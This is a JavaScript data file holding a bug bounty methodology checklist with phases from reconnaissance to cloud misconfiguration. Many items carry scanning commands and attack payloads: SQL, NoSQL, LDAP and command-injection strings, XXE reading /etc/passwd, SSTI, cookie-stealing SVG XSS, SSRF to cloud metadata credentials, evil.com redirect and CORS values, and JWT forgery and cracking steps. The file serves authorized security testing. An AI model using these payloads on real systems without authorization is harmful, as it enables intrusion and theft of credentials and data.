/**
 * checklist-data.js
 * Full bug bounty methodology checklist.
 * Each phase → items with id, text, severity, sub-notes.
 */

export const CHECKLIST_PHASES = [
  {
    id: 'recon-passive',
    title: 'Passive Reconnaissance',
    icon: '🌐',
    badge: 'recon',
    items: [
      { id: 'r1',  text: 'Subdomain enumeration — Amass, Subfinder, Assetfinder', sub: 'amass enum -d target.com | subfinder -d target.com | assetfinder target.com | anew subdomains.txt', sev: 'info' },
      { id: 'r2',  text: 'Certificate transparency logs — crt.sh, Censys, cert.sh API', sub: 'curl "https://crt.sh/?q=%.target.com&output=json" | jq .[].name_value', sev: 'info' },
      { id: 'r3',  text: 'DNS Brute-force — puredns + resolvers list', sub: 'puredns bruteforce wordlist.txt target.com -r resolvers.txt', sev: 'info' },
      { id: 'r4',  text: 'Probe for live hosts — httpx with title, status, tech', sub: 'cat subdomains.txt | httpx -silent -title -status-code -tech-detect -o live.txt', sev: 'info' },
      { id: 'r5',  text: 'ASN & IP range discovery — ASN lookup, BGP.he.net', sub: 'amass intel -org "Target Inc" | tee asn.txt', sev: 'info' },
      { id: 'r6',  text: 'WHOIS & Reverse WHOIS for related domains', sub: 'whois target.com | grep -i "registrant email" → then reverse WHOIS on that email', sev: 'info' },
      { id: 'r7',  text: 'Shodan / FOFA / Censys — expose origin IPs, services, banners', sub: 'shodan search "Org: Target" port:443 ssl.cert.subject.CN:"target.com"', sev: 'medium' },
      { id: 'r8',  text: 'Wayback Machine URLs — gau + waybackurls + katana + gospider', sub: 'gau target.com | waybackurls target.com | katana -u target.com -jc | anew all-urls.txt', sev: 'info' },
      { id: 'r9',  text: 'Filter live JS URLs from collected URLs', sub: 'cat all-urls.txt | grep "\\.js" | httpx -silent -mc 200 | tee live-js.txt', sev: 'medium' },
      { id: 'r10', text: 'Port scan origin IPs — Nmap (SYN, service, version)', sub: 'nmap -sV -sC -T4 -p 80,443,8080,8443,3000,8000,9000 <origin-ip>', sev: 'medium' },
      { id: 'r11', text: 'Nuclei scan on live hosts (tech-specific templates)', sub: 'nuclei -l live.txt -t technologies/ -t exposures/ -t misconfigurations/ -o nuclei-out.txt', sev: 'high' },
    ]
  },
  {
    id: 'js-analysis',
    title: 'JS Analysis & API Discovery',
    icon: '🔍',
    badge: 'analysis',
    items: [
      { id: 'js1',  text: 'Download & beautify all live JS files', sub: 'cat live-js.txt | xargs -I{} sh -c \'curl -sk {} | js-beautify > js/$(echo {} | md5sum | cut -c1-8).js\'', sev: 'medium' },
      { id: 'js2',  text: 'Extract API endpoints — LinkFinder, JSLinkFinder', sub: 'linkfinder -i "https://target.com/app.js" -o cli | anew endpoints.txt', sev: 'high' },
      { id: 'js3',  text: 'Secret hunting — truffleHog, gitleaks, nuclei secrets templates', sub: 'trufflehog filesystem ./js/ --only-verified', sev: 'critical' },
      { id: 'js4',  text: 'Manual JS review — hardcoded API keys, tokens, credentials', sub: 'Look for: apiKey, secret, token, password, clientId, clientSecret, AWS_', sev: 'critical' },
      { id: 'js5',  text: 'Regex secret scan — 40+ patterns (AWS, GCP, Stripe, Twilio, etc.)', sub: 'grep -rE "(AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z-_]{35}|sk_live_[a-zA-Z0-9]{24})" js/', sev: 'critical' },
      { id: 'js6',  text: 'Map all API paths, parameters, and HTTP methods from JS', sub: 'Document: /api/v1/users, /api/admin/*, /internal/* etc.', sev: 'high' },
      { id: 'js7',  text: 'Look for hidden debug/admin routes in JS routing tables', sub: 'Search for: isAdmin, role=, admin:, debug:true in JS source', sev: 'high' },
      { id: 'js8',  text: 'Check npm/yarn packages for known vulnerable versions', sub: 'Extract package versions from bundle → check in OSV / npm audit', sev: 'medium' },
    ]
  },
  {
    id: 'dorking',
    title: 'OSINT Dorking',
    icon: '🔎',
    badge: 'recon',
    items: [
      { id: 'd1',  text: 'Google Dorking — login/admin panels, config files, errors', sub: 'Use Dork Library tab for auto-generated dorks per domain', sev: 'medium' },
      { id: 'd2',  text: 'GitHub Dorking — leaked secrets, internal repos, tokens', sub: 'org:target-company password | org:target-company secret | filename:.env target.com', sev: 'critical' },
      { id: 'd3',  text: 'Shodan Dorking — exposed services, cameras, DBs', sub: 'hostname:target.com | ssl.cert.subject.CN:"target.com"', sev: 'high' },
      { id: 'd4',  text: 'URLScan.io — historical screenshots, requests, cookies', sub: 'page.domain:target.com | page.url:target.com/api', sev: 'medium' },
      { id: 'd5',  text: 'Pastebin / Pastego — leaked credentials, internal data', sub: 'pastego -s "target.com" -t api_key,password,secret,token', sev: 'high' },
      { id: 'd6',  text: 'LinkedIn/OSINT — employee emails, tech stack, infra', sub: 'Use hunter.io, clearbit for email patterns', sev: 'info' },
      { id: 'd7',  text: 'S3 / GCS / Azure blob — exposed cloud storage', sub: 'nuclei -t s3-detect -t gcs-detect | GrayhatWarfare for bucket enum', sev: 'high' },
    ]
  },
  {
    id: 'fuzzing',
    title: 'Fuzzing & Directory Discovery',
    icon: '🎯',
    badge: 'analysis',
    items: [
      { id: 'f1',  text: 'Directory & file brute-force — ffuf, feroxbuster', sub: 'ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403', sev: 'medium' },
      { id: 'f2',  text: 'API endpoint fuzzing — technology-specific wordlists', sub: 'ffuf -u https://api.target.com/FUZZ -w seclists/Discovery/Web-Content/api/api-endpoints.txt', sev: 'high' },
      { id: 'f3',  text: 'Parameter fuzzing — Arjun, x8', sub: 'arjun -u https://target.com/search --get --post', sev: 'high' },
      { id: 'f4',  text: 'Virtual host enumeration — ffuf VHost mode', sub: 'ffuf -w subdomains.txt -u https://target.com -H "Host: FUZZ.target.com" -mc 200', sev: 'medium' },
      { id: 'f5',  text: 'Backup & config file discovery (.bak, .env, .git, .svn)', sub: 'Use seclists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt', sev: 'critical' },
      { id: 'f6',  text: '403 bypass fuzzing — path normalization, headers', sub: 'X-Original-URL, X-Forwarded-For, X-Custom-IP-Authorization; /%2e/admin; //admin', sev: 'high' },
    ]
  },
  {
    id: 'auth-session',
    title: 'Broken Authentication & Session',
    icon: '🔐',
    badge: 'critical',
    items: [
      { id: 'a1',  text: 'Username enumeration — login, forgot password, register errors', sub: 'Different error messages or timing for valid vs invalid users', sev: 'medium' },
      { id: 'a2',  text: 'Password spray & credential stuffing', sub: 'Check rate-limiting, CAPTCHA bypass, IP rotation needed', sev: 'high' },
      { id: 'a3',  text: 'CAPTCHA bypass — audio, OCR, remove parameter, replay', sub: 'Remove captcha parameter, replay old captcha value, use audio 2captcha', sev: 'medium' },
      { id: 'a4',  text: 'Account lockout bypass — IP rotation, X-Forwarded-For', sub: 'X-Forwarded-For: 127.0.0.1 | X-Real-IP: 1.2.3.4 header manipulation', sev: 'medium' },
      { id: 'a5',  text: 'Password reset — token entropy, reuse, expiry, host header', sub: 'Intercept reset link; test if token changes each request, test host header injection', sev: 'high' },
      { id: 'a6',  text: 'OAuth 2.0 misconfigurations — state param, redirect_uri, token leakage', sub: 'Missing state, open redirect_uri, implicit flow token in Referer', sev: 'high' },
      { id: 'a7',  text: 'Session token not invalidated after logout', sub: 'Logout → copy token → use in new browser → should return 401', sev: 'high' },
      { id: 'a8',  text: 'Same session token persists across login (fixation)', sub: 'Log in, log out, log back in — session ID must change each login', sev: 'high' },
      { id: 'a9',  text: 'Concurrent session handling — multiple active sessions', sub: 'Login on two devices — old session should invalidate or alert', sev: 'low' },
      { id: 'a10', text: 'Remember-me token analysis — predictable, long-lived, reusable', sub: 'Decode remember-me cookie; check if userId is embedded and unsigned', sev: 'high' },
      { id: 'a11', text: 'MFA bypass — backup codes, race condition, response manipulation', sub: 'Intercept MFA verify response; change 401 → 200; test backup code brute-force', sev: 'critical' },
      { id: 'a12', text: 'Login-As / impersonation token exposure', sub: 'Check for loginAs, actAs, X-Impersonate-User in requests or JS code', sev: 'critical' },
    ]
  },
  {
    id: 'jwt-tokens',
    title: 'JWT & Token Analysis',
    icon: '🪙',
    badge: 'auth',
    items: [
      { id: 'j1',  text: 'Decode JWT — check alg, claims, expiry, and sensitive data', sub: 'jwt.io | python -c "import jwt; print(jwt.decode(token, options={\'verify_signature\':False}))"', sev: 'medium' },
      { id: 'j2',  text: 'Algorithm confusion — RS256 → HS256 (public key as secret)', sub: 'Change alg to HS256, sign with server\'s public key → if accepted = critical', sev: 'critical' },
      { id: 'j3',  text: 'JWT none algorithm — alg: none attack', sub: 'Set alg to "none", remove signature portion, send forged token', sev: 'critical' },
      { id: 'j4',  text: 'Weak secret brute-force — hashcat JWT crack', sub: 'hashcat -a 0 -m 16500 <jwt> /usr/share/wordlists/rockyou.txt', sev: 'critical' },
      { id: 'j5',  text: 'JWT kid header injection (SQL, path traversal, SSRF)', sub: '"kid": "../../../../dev/null" or "kid": "1 UNION SELECT secret FROM keys"', sev: 'critical' },
      { id: 'j6',  text: 'JWT jku / x5u header injection — supply own JWKS endpoint', sub: 'Set jku to your controlled server with crafted RSA key, forge token', sev: 'critical' },
      { id: 'j7',  text: 'Token expiry validation — accept expired tokens?', sub: 'Use expired JWT, verify 401 is returned not 200', sev: 'high' },
      { id: 'j8',  text: 'Token substitution — swap tokens between accounts', sub: 'Use AccountA JWT on AccountB endpoints → should fail', sev: 'high' },
      { id: 'j9',  text: 'Sensitive data in JWT payload (PII, internal IDs)', sub: 'Check claims for email, SSN, internal IP, DB IDs exposed to client', sev: 'medium' },
    ]
  },
  {
    id: 'idor',
    title: 'IDOR & Broken Object-Level Auth',
    icon: '🆔',
    badge: 'high',
    items: [
      { id: 'i1',  text: 'Horizontal IDOR — access other users\' objects by changing ID', sub: 'GET /api/users/1001 (yours) → change to /api/users/1002 → other user\'s data', sev: 'high' },
      { id: 'i2',  text: 'Vertical IDOR — access admin objects as regular user', sub: 'GET /api/admin/users/1001 as low-priv user → should return 403', sev: 'critical' },
      { id: 'i3',  text: 'IDOR in file downloads — document IDs, invoice IDs', sub: '/download?file=invoice_1234.pdf → increment ID, change to other user\'s files', sev: 'high' },
      { id: 'i4',  text: 'IDOR in POST body — hidden object references in request', sub: 'POST /update {"userId": 123} — change userId in body, not just URL', sev: 'high' },
      { id: 'i5',  text: 'UUID / GUID IDOR — predictable or leaked UUIDs', sub: 'UUIDs found in emails, JS, or responses → use them to access other objects', sev: 'high' },
      { id: 'i6',  text: 'Indirect IDOR — reference through another object', sub: 'GET /projects/ABC/members → change ABC to other project ID', sev: 'high' },
      { id: 'i7',  text: 'IDOR in GraphQL — query other users\' nodes directly', sub: 'query { user(id: "otherUserId") { email, profile { ... } } }', sev: 'high' },
      { id: 'i8',  text: 'Mass assignment — send extra fields to elevate object ownership', sub: 'POST /orders {items:[...], userId: victimId} — add userId to claim their order', sev: 'high' },
      { id: 'i9',  text: 'IDOR in websocket subscriptions — subscribe to other users\' events', sub: 'Subscribe to /ws/user/{id}/notifications with another user\'s ID', sev: 'high' },
      { id: 'i10', text: 'Chained IDOR — combine IDOR with CSRF or SQLi for greater impact', sub: 'IDOR → get user email → use for account takeover chain', sev: 'critical' },
    ]
  },
  {
    id: 'privilege-esc',
    title: 'Privilege Escalation & RBAC',
    icon: '⬆️',
    badge: 'critical',
    items: [
      { id: 'p1',  text: 'Map all roles — identify user, manager, admin, super-admin, API access', sub: 'Register multiple accounts at different permission levels, document all accessible endpoints', sev: 'info' },
      { id: 'p2',  text: 'Admin endpoint access as low-priv user (vertical escalation)', sub: 'GET /admin/dashboard, /api/admin/*, /management/* as regular user', sev: 'critical' },
      { id: 'p3',  text: 'Role parameter tampering — role=user in JWT or cookies → role=admin', sub: 'Decode JWT → change role claim → re-sign (if weak secret) or test if server validates', sev: 'critical' },
      { id: 'p4',  text: 'Missing function-level auth — admin actions without role check', sub: 'DELETE /api/users/1002 as regular user → should return 403', sev: 'critical' },
      { id: 'p5',  text: 'Group/org escalation — join admin group, invite self as admin', sub: 'POST /org/members with role:admin in body; test self-invitation flows', sev: 'high' },
      { id: 'p6',  text: 'Feature flagging bypass — enable premium/admin features as free user', sub: 'Look for feature flags in JS (isAdmin, isPremium) → test disabling via Burp', sev: 'medium' },
      { id: 'p7',  text: 'Workflow bypass — skip approval steps (draft → published, unverified → admin)', sub: 'POST /publish without going through required approval step', sev: 'high' },
      { id: 'p8',  text: 'API key privilege — test API keys with different scopes', sub: 'Is read-only API key accepted on write endpoints?', sev: 'medium' },
      { id: 'p9',  text: 'Account takeover via privilege chain — reset admin password as regular user', sub: 'Test if password reset applies to all user types including admins', sev: 'critical' },
    ]
  },
  {
    id: 'injection',
    title: 'Injection Vulnerabilities',
    icon: '💉',
    badge: 'critical',
    items: [
      { id: 'inj1', text: 'SQL Injection — manual & sqlmap on all input parameters', sub: 'sqlmap -u "https://target.com/search?q=1" --level=5 --risk=3 --batch --dbs', sev: 'critical' },
      { id: 'inj2', text: 'Blind SQL Injection — time-based, boolean-based (sleep, WAITFOR)', sub: 'q=1\' AND SLEEP(5)-- | 1\' AND 1=2-- vs 1\' AND 1=1--', sev: 'critical' },
      { id: 'inj3', text: 'NoSQL Injection — MongoDB, CouchDB operators in JSON body', sub: '{"username": {"$gt": ""}, "password": {"$gt": ""}} — bypass login', sev: 'critical' },
      { id: 'inj4', text: 'GraphQL Injection & introspection query', sub: '{__schema {types {name fields {name}}}} — map entire schema', sev: 'high' },
      { id: 'inj5', text: 'Command Injection — OS commands in upload names, search, ping', sub: '; id | whoami; `id` $(id) — test all inputs interacting with OS', sev: 'critical' },
      { id: 'inj6', text: 'LDAP Injection — authentication bypass via LDAP queries', sub: 'username=*)(uid=*))(|(uid=* → bypass auth in directory-based apps', sev: 'high' },
      { id: 'inj7', text: 'XSS — reflected, stored, DOM-based across all inputs', sub: 'dalfox url "https://target.com/search?q=XSS" | Use Burp active scanner', sev: 'medium' },
      { id: 'inj8', text: 'SSTI — Server-Side Template Injection (Jinja2, Twig, Freemarker)', sub: '{{7*7}} → 49? Try {{config}} → RCE via {{config.__class__.__init__.__globals__[...]}}', sev: 'critical' },
      { id: 'inj9', text: 'XXE — XML External Entity in file upload, SOAP, SVG', sub: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', sev: 'high' },
    ]
  },
  {
    id: 'ssrf-redirect',
    title: 'SSRF, Redirect & Request Smuggling',
    icon: '🌊',
    badge: 'high',
    items: [
      { id: 'ss1', text: 'SSRF — url, webhook, redirect, import parameters', sub: 'url=http://169.254.169.254/latest/meta-data/ | url=http://localhost:6379/', sev: 'critical' },
      { id: 'ss2', text: 'Blind SSRF — Burp Collaborator, interactsh callbacks', sub: 'url=http://your.burpcollaborator.net/ → check OOB DNS/HTTP hits', sev: 'high' },
      { id: 'ss3', text: 'SSRF filter bypass — DNS rebinding, redirects, alternative notations', sub: '127.0.0.1 → 0x7f000001 | 127.1 | localhost → [::1] | 0.0.0.0', sev: 'high' },
      { id: 'ss4', text: 'Open Redirect — redirect, next, return, url, to parameters', sub: '/login?next=//evil.com | ?redirect=javascript:alert(1) | ?url=https://evil.com', sev: 'medium' },
      { id: 'ss5', text: 'HTTP Request Smuggling — CL.TE, TE.CL, TE.TE', sub: 'Use Burp HTTP Request Smuggler extension; test on any proxy/load balancer setup', sev: 'critical' },
    ]
  },
  {
    id: 'csrf-cors',
    title: 'CSRF, CORS & Headers',
    icon: '🛡️',
    badge: 'medium',
    items: [
      { id: 'c1',  text: 'CSRF — missing/bypassable token on state-changing actions', sub: 'Remove CSRF token, change to GET, use null origin — if action proceeds = vulnerable', sev: 'high' },
      { id: 'c2',  text: 'CORS misconfiguration — arbitrary origin reflection', sub: 'Origin: https://evil.com → if ACAO reflects evil.com with ACAC: true = critical', sev: 'critical' },
      { id: 'c3',  text: 'CORS — null origin bypass', sub: 'Origin: null → check if ACAO: null is returned with credentials', sev: 'high' },
      { id: 'c4',  text: 'Auth token leaked in Referer header', sub: 'Outgoing requests from authenticated pages — check Referer for tokens in URL params', sev: 'medium' },
      { id: 'c5',  text: 'Security headers audit — CSP, HSTS, X-Frame-Options, etc.', sub: 'Missing CSP? Clickjacking possible? Weak SameSite cookie attribute?', sev: 'low' },
      { id: 'c6',  text: 'Cookie security — HttpOnly, Secure, SameSite flags', sub: 'All session cookies must have HttpOnly=true, Secure=true, SameSite=Strict/Lax', sev: 'medium' },
      { id: 'c7',  text: 'Subdomain takeover — dangling DNS CNAME to unclaimed service', sub: 'subjack -w subdomains.txt -t 100 -ssl | check for "Not Found" on Heroku, GitHub Pages', sev: 'high' },
    ]
  },
  {
    id: 'file-upload',
    title: 'File Upload & Storage',
    icon: '📁',
    badge: 'high',
    items: [
      { id: 'fu1', text: 'Unrestricted file upload — PHP, ASPX, JSP webshells', sub: 'Change Content-Type to image/jpeg; double extension file.php.jpg; null byte file.php%00.jpg', sev: 'critical' },
      { id: 'fu2', text: 'SVG upload XSS — stored XSS via SVG with script', sub: '<svg><script>alert(document.cookie)</script></svg> — upload as SVG', sev: 'high' },
      { id: 'fu3', text: 'Path traversal in upload filename', sub: 'filename="../../etc/passwd" | filename="../shell.php"', sev: 'critical' },
      { id: 'fu4', text: 'ImageMagick / FFmpeg SSRF via file metadata (ImageTragick)', sub: 'Craft malicious ImageMagick MVG file; test SSRF on server-side image processing', sev: 'critical' },
      { id: 'fu5', text: 'Unauthenticated / public file access after upload', sub: 'Upload file as UserA, access URL as UserB or unauthenticated', sev: 'high' },
      { id: 'fu6', text: 'Cloud storage misconfiguration — public S3 bucket, GCS ACL', sub: 'Check bucket policy; try s3:ListBucket, s3:GetObject without auth', sev: 'high' },
    ]
  },
  {
    id: 'business-logic',
    title: 'Business Logic & Race Conditions',
    icon: '⚙️',
    badge: 'high',
    items: [
      { id: 'bl1', text: 'Price manipulation — negative quantities, discount stacking, rounding', sub: 'Add item qty=-1; apply multiple discount codes; price=0.001', sev: 'high' },
      { id: 'bl2', text: 'Race condition — multiple requests simultaneously (Turbo Intruder)', sub: 'Coupon code use, vote, withdrawal — 20 concurrent requests via Turbo Intruder', sev: 'high' },
      { id: 'bl3', text: 'Workflow bypass — skip verification, payment, approval steps', sub: 'Jump directly to order confirmation without completing payment flow', sev: 'high' },
      { id: 'bl4', text: 'Free trial abuse — exploit trial extension logic', sub: 'Re-register with sub-addressing, manipulate trial_end date in request', sev: 'medium' },
      { id: 'bl5', text: 'Mass assignment — add extra params (isAdmin, role, credit)', sub: 'Register with extra JSON fields: {"email":"x","role":"admin","balance":99999}', sev: 'critical' },
      { id: 'bl6', text: 'Insecure direct delivery — access paid content without payment', sub: 'Enumerate /download/{id} after seeing one paid content ID', sev: 'high' },
    ]
  },
  {
    id: 'cloud-infra',
    title: 'Cloud & Infrastructure',
    icon: '☁️',
    badge: 'high',
    items: [
      { id: 'cl1', text: 'Cloud metadata — AWS IMDSv1 via SSRF (169.254.169.254)', sub: 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/', sev: 'critical' },
      { id: 'cl2', text: 'S3 / GCS bucket enumeration and misconfiguration', sub: 'aws s3 ls s3://target-bucket --no-sign-request | aws s3 cp s3://target-bucket/secret.txt .', sev: 'high' },
      { id: 'cl3', text: 'Firebase misconfiguration — open Realtime Database rules', sub: 'curl https://your-target.firebaseio.com/.json — should return 401, not data', sev: 'high' },
      { id: 'cl4', text: 'Kubernetes API exposure — open dashboard, API server', sub: 'Check :6443, :8080, :10250 — kubelet, API server anonymous access', sev: 'critical' },
      { id: 'cl5', text: 'Elasticsearch / Kibana open without auth', sub: 'Check :9200/_cat/indices, :5601/app/kibana — unauthenticated data exposure', sev: 'critical' },
      { id: 'cl6', text: 'Docker API exposure — remote management port 2375/2376', sub: 'curl http://target:2375/v1.41/containers/json — if returns container list = critical', sev: 'critical' },
      { id: 'cl7', text: 'GraphQL introspection enabled in production', sub: '{"query": "{__schema{types{name}}}"} — should return 400/403 in production', sev: 'medium' },
    ]
  },
];

export const SEVERITY_ORDER = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
